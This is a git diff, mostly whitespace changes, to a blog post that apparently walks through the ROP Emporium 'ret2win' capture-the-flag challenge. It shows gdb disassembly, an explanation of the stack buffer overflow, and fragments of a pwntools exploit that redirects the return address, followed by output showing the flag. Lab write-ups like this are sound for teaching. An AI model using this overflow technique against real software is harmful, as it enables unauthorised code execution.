@@ -1,17 +1,18 @@
 ---
 title: Return-Oriented Programming - ret2win
 date: '2021-12-20'
-tags: ['ropemporium','rop', 'pwn']
+tags: ['ropemporium', 'rop', 'pwn']
 draft: false
 summary: ret2win means return here to win and it's recommended you start with this challenge. Visit the challenge page by clicking this card to learn more.
-images: []
+images: '/static/images/ropemporium/ret2win.jpg'
 layout: PostLayout
 ---
 
 # Introduction
+
 Challenge description
 
->Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.
+> Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.
 
 This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.
 
@@ -29,6 +30,7 @@ vx@archie:ret2win$ checksec --file ret2win
 ```
 
 Only **NX** (Not executable) is enabled on the binary meaning we cannot execute code stored on the stack like shellcode.and the behavior of this program we will use gdb. gdb is a tools that enables to inspect the behavior of binaries at runtime.
+
 ```nasm
 (gdb) info functions
 All defined functions:
@@ -53,8 +55,9 @@ Non-debugging symbols:
 0x0000000000400780  __libc_csu_init
 0x00000000004007f0  __libc_csu_fini
 0x00000000004007f4  _fini
-(gdb) 
+(gdb)
 ```
+
 The binary has various functions has as shown in the output above.For initial analysis we start at the main function which is the entrypoint of our program.
 
 ```nasm
@@ -79,10 +82,11 @@ Dump of assembler code for function main:
    0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
    0x00000000004006e1 <+74>:	mov    eax,0x0
    0x00000000004006e6 <+79>:	pop    rbp
-   0x00000000004006e7 <+80>:	ret    
+   0x00000000004006e7 <+80>:	ret
 End of assembler dump.
-(gdb) 
+(gdb)
 ```
+
 From the initial analysis of the main function, we are calling an interesting function called **pwnme**. Next disassemble **pwnme** function to understand the behavior.
 
 ```nasm
@@ -113,11 +117,12 @@ Dump of assembler code for function pwnme:
    0x0000000000400749 <+97>:	mov    edi,0x40091b
    0x000000000040074e <+102>:	call   0x400550 <puts@plt>
    0x0000000000400753 <+107>:	nop
-   0x0000000000400754 <+108>:	leave  
-   0x0000000000400755 <+109>:	ret    
+   0x0000000000400754 <+108>:	leave
+   0x0000000000400755 <+109>:	ret
 End of assembler dump.
 ```
-From the disassembled code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. **memset** is used to overwrite any values present memory area specified. The memory are we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size  32 bytes from the address of base pointer as shown in the stack diagram below.
+
+From the disassembled code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. **memset** is used to overwrite any values present memory area specified. The memory are we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer as shown in the stack diagram below.
 
 ![](/static/images/ropemporium/stack.png)
 
@@ -126,15 +131,17 @@ Therefore the next function is **read** function, which reads from the standard 
 ```c
 read(0, *[rbp-0x20], 0x38) //0 is file descriptor stdin
 ```
-Because we are reading more than the buffer can hold, we corrupt the adjacent memory regions therefore casusing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image shown above is to fill the buffer, overwrite the rbp register and control the return address with our desired address which is **ret2win** function address. 
+
+Because we are reading more than the buffer can hold, we corrupt the adjacent memory regions therefore casusing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image shown above is to fill the buffer, overwrite the rbp register and control the return address with our desired address which is **ret2win** function address.
 
 ## Exploit
 
 The exploit code for this ret2win function is,
+
 ```python
 import pwn
 
-pwn.context.encoding = "latin-1" 
+pwn.context.encoding = "latin-1"
 pwn.warnings.simplefilter("ignore")
 pwn.context.arch = "amd64"
 
@@ -151,7 +158,7 @@ pwn.info(io.clean().decode())
 Running the script we get the flag.
 
 ```bash
-vx@archie:ret2win$ python3 x.py 
+vx@archie:ret2win$ python3 x.py
 [+] Starting local process './ret2win': pid 45427
 [*]  Thank you!
     Well done! Here's your flag:
